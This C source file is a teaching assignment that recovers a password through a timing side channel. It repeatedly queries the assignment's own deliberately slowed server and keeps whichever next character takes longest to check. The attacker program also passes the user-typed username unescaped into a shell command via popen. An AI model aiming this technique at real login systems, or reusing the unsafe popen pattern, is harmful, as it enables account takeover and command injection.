#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#define popen _popen
#define pclose _pclose
#define SERVER_COMMAND "bin\\server.exe"
#else
#define SERVER_COMMAND "./bin/server"
#endif

#define MAX_PASSWORD_LENGTH 32
#define MAX_COMMAND_LENGTH 256
#define MAX_OUTPUT_LENGTH 256

/*
    This file demonstrates the timing attack part of the assignment.
    The main server contains a special command mode that allows another program
    to check one password guess and receive the time that the check took.
    Example:
    ./bin/server timing admin sec
    The server prints:
    result=0 or result=1
    time=<microseconds>
    The vulnerable comparison in the server checks the password character by character.
    After every correct character, the server waits for a short time.
    Because of that, a guess with more correct characters at the beginning
    takes more time to check.
    This program uses that timing difference to recover the password.
*/

/*
    This function runs the server with one password guess.
    Parameters:
    username - the username we want to attack.
    guess    - the password guess that will be sent to the server.
    result   - output parameter. It will contain 1 if the login succeeded, and 0 otherwise.
    Return value:
    The measured time in microseconds, as returned by the server.
    If the server command failed, the function returns -1.
*/
long run_timing_check(const char *username, const char *guess, int *result)
{
    char command[MAX_COMMAND_LENGTH];
    char output[MAX_OUTPUT_LENGTH];
    FILE *pipe;
    long measured_time = 0;

    *result = 0;

    // Build the command that runs the vulnerable server in timing mode. The server will check the given username and password guess,then print the result and the measured time.
    snprintf(command, sizeof(command), "%s timing %s %s", SERVER_COMMAND, username, guess);

    //popen runs the command and allows this program to read the output. This is useful here because the attacker program needs to read the time printed by the vulnerable server.
    pipe = popen(command, "r");

    if (pipe == NULL) {
        printf("Could not run server command.\n");
        return -1;
    }

    // Read the output of the server line by line. The server prints result=<number> and time=<number>.  We parse these two values from the output.
    while (fgets(output, sizeof(output), pipe) != NULL) {
        if (strncmp(output, "result=", 7) == 0) {
            *result = atoi(output + 7);
        }

        if (strncmp(output, "time=", 5) == 0) {
            measured_time = atol(output + 5);
        }
    }

    pclose(pipe);

    return measured_time;
}

// This function runs the same guess several times and returns the average time. Timing measurements may have small changes because the operating system is busy with other processes. Averaging a few attempts makes the result more stable.
long average_timing_check(const char *username, const char *guess, int *result)
{
    int i;
    int current_result;
    long total_time = 0;
    long current_time;
    int attempts = 3;

    *result = 0;

    for (i = 0; i < attempts; i++) {
        current_time = run_timing_check(username, guess, &current_result);

        if (current_time < 0) {
            return -1;
        }

        total_time += current_time;

        // If one of the attempts succeeded, we keep the result as success. This means the full password was found.
        if (current_result == 1) {
            *result = 1;
        }
    }

    return total_time / attempts;
}

/*
    This function tries to recover the password one character at a time.
    The idea:
    1. Try every possible next character.
    2. Measure how long the server takes to check it.
    3. The guess with the longest time probably has the longest correct prefix.
    4. Add that character to the recovered password.
    5. Repeat until the full password is found.
*/
void recover_password(const char *username)
{
    char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    char recovered[MAX_PASSWORD_LENGTH];
    char guess[MAX_PASSWORD_LENGTH];
    int recovered_length = 0;
    int charset_length;
    int i;
    int login_result;
    long best_time;
    long current_time;
    char best_char;

    memset(recovered, 0, sizeof(recovered));

    charset_length = strlen(charset);

    printf("Timing attack started for user: %s\n", username);
    printf("----------------------------------------\n");

    // The loop continues until the password is found, or until the maximum password length is reached.
    while (recovered_length < MAX_PASSWORD_LENGTH - 1) {
        best_time = -1;
        best_char = '\0';

        //Try every possible next character from the charset. For example, if the recovered prefix is "se", the program will try "sea", "seb", "sec", and so on.
        
        for (i = 0; i < charset_length; i++) {
            snprintf(guess, sizeof(guess), "%s%c", recovered, charset[i]);

            current_time = average_timing_check(username, guess, &login_result);

            if (current_time < 0) {
                printf("Attack stopped because the server command failed.\n");
                return;
            }

            printf("Trying %-20s time = %ld microseconds\n", guess, current_time);

            //  If the server says that the login succeeded, the current guess is the full password.
            
            if (login_result == 1) {
                printf("----------------------------------------\n");
                printf("Password found: %s\n", guess);
                return;
            }

            //The guess with the longest measured time probably contains the correct next character, because the server waited longer for a longer correct prefix.
            if (current_time > best_time) {
                best_time = current_time;
                best_char = charset[i];
            }
        }

        //  Add the best character to the recovered prefix. Then continue to find the next character.
        recovered[recovered_length] = best_char;
        recovered_length++;
        recovered[recovered_length] = '\0';

        printf("----------------------------------------\n");
        printf("Current recovered prefix: %s\n", recovered);
        printf("----------------------------------------\n");
    }

    printf("Password was not fully recovered.\n");
}

// Main function of the timing attack program. The user enters the username to attack, and the program tries to recover that user's password.
int main()
{
    char username[64];

    printf("Enter username to attack: ");
    fgets(username, sizeof(username), stdin);

    username[strcspn(username, "\n")] = '\0';

    if (strlen(username) == 0) {
        printf("Username cannot be empty.\n");
        return 1;
    }

    recover_password(username);

    return 0;
}